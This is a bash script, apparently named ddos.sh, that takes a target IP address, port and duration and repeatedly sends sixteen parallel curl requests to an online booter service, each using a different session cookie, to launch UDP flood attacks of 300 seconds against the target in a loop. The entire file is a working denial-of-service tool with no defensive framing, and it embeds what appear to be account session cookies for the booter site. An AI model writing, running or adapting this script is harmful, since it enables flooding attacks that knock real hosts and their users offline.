#!/bin/bash
BOMB=0

if [[ -z $1 || -z $2 || -z $3 ]]
then
  echo 'Usage: ./ddos.sh ip_address port time'
  exit
fi

IP=$1
PORT=$2
let BOMB_TIME=$3/5

while [ $BOMB -lt $BOMB_TIME ]
do
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=cefcc8ce-be3e-4a2d-bf75-697d78a8e126' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=71e7b7d7-8a9e-41cf-b46b-b4f7122e0808' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=02045c19-1eae-41ca-8a79-2c201b4d61e1' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=59317e97-fa4f-48ea-81ea-7441a9cf3522' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=3c1a283b-ef5e-423a-9f4d-f198fd38ada2' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=331eb1a6-5d73-4506-bb80-e4bdb638afab' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=fcd51da4-476b-4042-baf4-afb14c387bbc' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=d21aedeb-ec94-489b-bfd7-2df78c7c7385' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=a1fd3a95-07f8-46de-b291-83435a62c26b' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=700d88b1-696b-4a5a-bdda-56b0aaa63954' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=b7e2a6d7-bc74-4893-a2a2-7263cc6f2711' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=1c4ce7cd-4c70-4615-9991-fa2afd7dfcd3' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=82c1b86d-3307-4f52-9114-ba04139c4393' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=426c9bbe-18e0-450a-a023-6a758699eb7f' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=265e86bc-b959-4db2-bcb6-bdb065a5df23' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  curl 'https://www.stressthem.to/booter?handle' -H 'Cookie: UID=f4f91809-7f28-4711-8930-3c7a1762ae47' --data-binary '{"method_l4":"udpmix","host":"'$IP'","port":'$PORT',"time":300}' --compressed > /dev/null 2>&1 &
  sleep 310
  let BOMB=BOMB+1
done
